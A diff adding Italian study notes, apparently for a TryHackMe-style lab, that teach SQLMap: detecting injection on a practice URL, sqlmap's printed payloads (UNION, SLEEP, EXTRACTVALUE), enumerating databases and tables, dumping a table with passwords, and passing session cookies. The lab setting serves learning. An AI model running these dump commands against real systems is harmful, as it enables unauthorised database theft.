@@ -2,22 +2,145 @@
 title: "SQLMap"
 date: 2026-08-18 08:00:00 +0200
 categories: [Cyber Security 101]
-tags: [offensive-security-tooling, sqlmap]
-description: ""
+tags: [offensive-security-tooling, sqlmap, SQLInjection]
+description: "SQL injection with SQLMap"
 toc: true
+
+
+**SQLMap** è uno strumento automatizzato per rilevare e sfruttare vulnerabilità di SQL injection nelle applicazioni web, semplificando il processo di identificazione.
+
+## Individuare la vulnerabilità
+
+Il flag **`--wizard`** guida passo passo attraverso lo scan, facendo domande per completare l'analisi — un'ottima opzione per chi è alle prime armi con lo strumento.
+
+```bash
+user@ubuntu:~$ sqlmap --wizard
+```
+
+In alternativa, prendiamo un URL supposto vulnerabile: `http://sqlmaptesting.thm`. Ipotizziamo che il sito abbia un'opzione di ricerca, e che cercando qualcosa l'URL diventi `http://sqlmaptesting.thm/search/cat=1`, usando il parametro GET `cat=1` per estrarre informazioni dal database. Come sappiamo, gli URL con parametri GET possono essere vulnerabili a SQL injection — scansioniamo questo URL per verificarlo.
+
+```bash
+user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
+      __H__
+ ___ ___[']_____ ___ ___  {1.2.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[08:43:49] [INFO] testing connection to the target URL
+[08:43:49] [INFO] heuristics detected web page charset 'ascii'
+[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[08:43:49] [INFO] testing if the target URL content is stable
+[08:43:50] [INFO] target URL content is stable
+[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
+[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
+[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
 ---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2175=2175
 
-## Cos'è
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))
 
-## Come funziona
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=1 AND SLEEP(5)
 
-### Esempio pratico
-
-## Un limite importante da conoscere
-
-## Utilizzo
-
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq
 ---
-**Modulo:** Offensive Security Tooling
-**Room:**
-**Data:** 18 agosto 2026
+[08:45:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+```
+
+I risultati confermano che diversi tipi di SQL injection sono possibili su questo URL — a questo punto usiamo i flag di SQLMap per sfruttarli ed estrarre dati dal database.
+
+## Enumerazione del database
+
+**Estrarre i nomi dei database — flag `--dbs`**
+
+```bash
+user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
+[08:49:00] [INFO] resuming back-end DBMS' mysql'
+[08:49:00] [INFO] testing connection to the target URL
+[08:49:01] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2175=2175
+[08:49:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+[08:49:01] [INFO] fetching database names
+available databases [2]:
+[*] users
+[*] members
+```
+
+Abbiamo ottenuto due nomi di database. Selezioniamo il database `users` ed estraiamo le tabelle al suo interno, definendo il database con il flag **`-D`** e usando il flag **`--tables`**.
+
+```bash
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
+[08:50:46] [INFO] resuming back-end DBMS' mysql'
+[08:50:46] [INFO] fetching tables for database: 'users'
+Database: acuart
+[3 tables]
++-----------+
+| johnath   |
+| alexas    |
+| thomas    |
++-----------+
+```
+
+Ora che abbiamo tutti i nomi delle tabelle disponibili, estraiamo i record presenti nella tabella `thomas`. Definiamo il database con il flag `-D`, la tabella con il flag **`-T`**, e per estrarre i record usiamo il flag **`--dump`**.
+
+```bash
+user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
+[08:51:48] [INFO] resuming back-end DBMS' mysql'
+[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
+[08:51:49] [INFO] fetching entries for table 'thomas' in database 'users'
+[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
+do you want to store hashes to a temporary file for eventual further processing n
+do you want to crack them via a dictionary-based attack? [Y/n/q] n
+Database: users
+Table: thomas
+[1 entry]
++---------------------+------------+---------+
+| Date                | name       | pass    |
++---------------------+------------+---------+
+| 09/09/2024          | Thomas THM | testing |
++---------------------+------------+---------+
+```
+
+## Testare applicazioni autenticate — il flag `--cookie`
+
+In scenari reali, molte applicazioni web si basano sui cookie per mantenere la sessione utente, applicare l'autenticazione, o imporre controlli di accesso. Testando queste applicazioni, fornire semplicemente un URL a SQLMap può non bastare, perché richieste non autenticate potrebbero essere reindirizzate, rifiutate, o restituire un contenuto diverso.
+
+SQLMap supporta il testing basato su cookie tramite il flag `--cookie`, che permette di includere i cookie di sessione (come `PHPSESSID`, `JSESSIONID`, o token di autenticazione) direttamente nella richiesta. Questo garantisce che SQLMap interagisca con l'applicazione nello stesso contesto autenticato/autorizzato di un utente normale. Ad esempio, dopo aver effettuato il login tramite browser e catturato il cookie di sessione, possiamo passarlo a SQLMap con:
+
+```bash
+sqlmap -u "http://target/login?email=test&password=test" --cookie="SESSIONID=abcdef123456" -D ai -T user --dump
+```
+
+per testare accuratamente punti di injection raggiungibili solo dopo l'autenticazione.
+
+**Attenzione al quoting dell'URL**: quando l'URL contiene parametri multipli separati da `&` (es. `?email=test&password=test`), va sempre racchiuso tra virgolette. Senza le virgolette, la shell interpreta `&` come operatore di background invece che come parte della query string, spezzando il comando e causando errori.
+
+## Aumentare la profondità dei risultati — il flag `--level`
+
+Il flag **`--level=5`** (il valore massimo) permette di ottenere risultati migliori, facendo testare a SQLMap un numero maggiore di payload e punti di injection — utile quando una scansione con i livelli di default non rileva nulla, ma si sospetta comunque la presenza di una vulnerabilità.
+
+```bash
+sqlmap -u "http://target/ai/includes/user_login?email=test&password=test" -D ai --tables --level=5
+```
